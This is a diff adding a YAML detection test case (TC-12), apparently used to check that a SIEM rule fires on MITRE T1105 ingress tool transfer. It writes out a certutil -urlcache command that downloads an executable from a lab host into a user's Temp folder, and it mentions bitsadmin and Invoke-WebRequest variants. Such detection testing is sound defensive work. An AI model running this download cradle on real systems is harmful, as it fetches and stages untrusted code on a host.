@@ -1,0 +1,15 @@
+id: TC-12
+name: Download cradle / ingress tool transfer
+technique: T1105
+atomic_ref: atomics/T1105 test 7
+command: 'certutil.exe -urlcache -split -f http://10.0.12.40/tool.exe C:\Users\jdoe\AppData\Local\Temp\tool.exe'
+expected_rule_ids:
+  - 100111
+expected_level: 10
+cleanup: 'del C:\Users\jdoe\AppData\Local\Temp\tool.exe'
+notes: >
+  Atomic T1105 test 7 (certutil -urlcache). Also run test 9
+  (bitsadmin /transfer). Serve the file from the lab HTTP host 10.0.12.40
+  or expect a failed download; 100111 keys on the command line, not a
+  successful write. Matches sample_events/TC-12. Invoke-WebRequest / iwr
+  is covered by the same rule.
